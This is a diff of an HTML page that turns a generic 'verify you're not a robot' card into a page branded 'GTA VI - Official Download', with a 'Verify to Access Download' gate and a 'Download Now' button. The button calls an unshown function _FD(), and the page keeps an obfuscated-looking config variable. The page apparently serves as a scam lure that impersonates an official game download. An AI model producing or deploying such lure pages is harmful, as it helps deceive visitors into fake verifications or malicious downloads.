@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verification</title>
+<title>GTA VI - Official Download</title>
 <script type="text/javascript">
     var kVpOy_KnO_fQfhVc={"it":4618390,"key":"66a40"};
 </script>
@@ -15,53 +15,67 @@
     display: flex;
     align-items: center;
     justify-content: center;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    background: linear-gradient(135deg, #ff2a6d, #05d9e8, #3b0086);
+    background-size: 400% 400%;
+    animation: gradientBG 10s ease infinite;
+  }
+  @keyframes gradientBG {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
   }
   .card {
-    background: rgba(255, 255, 255, 0.05);
-    backdrop-filter: blur(10px);
-    border: 1px solid rgba(255, 255, 255, 0.1);
-    border-radius: 16px;
-    padding: 40px 32px;
+    background: rgba(0, 0, 0, 0.75);
+    backdrop-filter: blur(12px);
+    border: 2px solid #ff2a6d;
+    border-radius: 20px;
+    padding: 40px 30px;
     width: 100%;
-    max-width: 360px;
+    max-width: 380px;
     text-align: center;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
   }
   .card h1 {
-    color: #ffffff;
-    font-size: 22px;
-    margin-bottom: 12px;
+    color: #fff;
+    font-size: 28px;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+    text-transform: uppercase;
+    text-shadow: 0 0 10px #ff2a6d;
   }
   .card p {
-    color: #c9c9d8;
-    font-size: 14px;
-    line-height: 1.5;
-    margin-bottom: 24px;
+    color: #05d9e8;
+    font-size: 15px;
+    margin-bottom: 25px;
+    font-weight: bold;
   }
   .card button {
     width: 100%;
-    padding: 12px 0;
+    padding: 14px 0;
     border: none;
-    border-radius: 8px;
-    background: #6c5ce7;
+    border-radius: 10px;
+    background: linear-gradient(90deg, #ff2a6d, #d9006c);
     color: #fff;
-    font-size: 15px;
-    font-weight: 600;
+    font-size: 16px;
+    font-weight: bold;
+    letter-spacing: 1px;
     cursor: pointer;
-    transition: background 0.2s ease;
+    text-transform: uppercase;
+    box-shadow: 0 0 15px rgba(255, 42, 109, 0.6);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
   }
   .card button:hover {
-    background: #5a4bd1;
+    transform: scale(1.03);
+    box-shadow: 0 0 25px rgba(255, 42, 109, 0.9);
   }
 </style>
 </head>
 <body>
   <div class="card">
-    <h1>Verify Your Identity</h1>
-    <p>Please confirm you're not a robot to continue securely.</p>
-    <button onclick="_FD()">Verify</button>
+    <h1>GTA VI</h1>
+    <p>Verify to Access Download</p>
+    <button onclick="_FD()">Download Now</button>
   </div>
 </body>
 </html>
